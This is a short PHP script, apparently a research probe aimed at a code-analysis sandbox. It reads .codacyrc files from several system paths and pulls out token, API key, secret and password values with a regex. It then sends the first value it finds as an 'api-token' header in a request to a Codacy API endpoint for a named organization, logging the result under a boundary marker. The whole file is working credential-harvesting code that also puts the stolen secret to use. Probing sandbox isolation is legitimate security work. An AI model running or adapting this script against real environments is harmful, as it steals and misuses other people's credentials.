<?php
$paths = ['/.codacyrc', '/src/.codacyrc', '/workspace/.codacyrc', '/app/.codacyrc', '/root/.codacyrc'];
$present = 0; $keyCount = 0; $candidate = ''; $candidatePath = 'none'; $bytes = 0;
foreach ($paths as $path) {
    $raw = @file_get_contents($path);
    if (!is_string($raw)) { continue; }
    $present++;
    $bytes += strlen($raw);
    $n = @preg_match_all('/["\']?([A-Za-z0-9_.-]*(?:TOKEN|API[_-]?KEY|SECRET|PASSWORD|CREDENTIAL)[A-Za-z0-9_.-]*)["\']?\s*[:=]\s*["\']?([A-Za-z0-9._~+\/-]{8,})/i', $raw, $m);
    if (is_int($n) && $n > 0) {
        $keyCount += $n;
        if ($candidate === '' && isset($m[2][0])) { $candidate = $m[2][0]; $candidatePath = $path; }
    }
}
$status = 'not_attempted'; $responseBytes = 0;
if ($candidate !== '') {
    $ctx = stream_context_create(['http' => ['method' => 'GET', 'header' => "api-token: " . $candidate . "\r\n", 'timeout' => 5, 'ignore_errors' => true]]);
    $resp = @file_get_contents('https://api.codacy.com/api/v3/analysis/organizations/gh/ABDUS-TEST-ORG/repositories/codacy-public-lab', false, $ctx);
    if (isset($http_response_header[0]) && preg_match('/\s(\d{3})\s/', $http_response_header[0], $sm)) { $status = $sm[1]; }
    else { $status = 'no_response'; }
    $responseBytes = is_string($resp) ? strlen($resp) : 0;
}
fwrite(STDERR, 'PHPMD_CODACYRC_BOUNDARY files=' . $present . ' bytes=' . $bytes . ' token_key_count=' . $keyCount . ' candidate_path=' . ($candidatePath === 'none' ? 'none' : 'present') . ' status=' . $status . ' response_bytes=' . $responseBytes . PHP_EOL);
throw new RuntimeException('PHPMD_CODACYRC_BOUNDARY');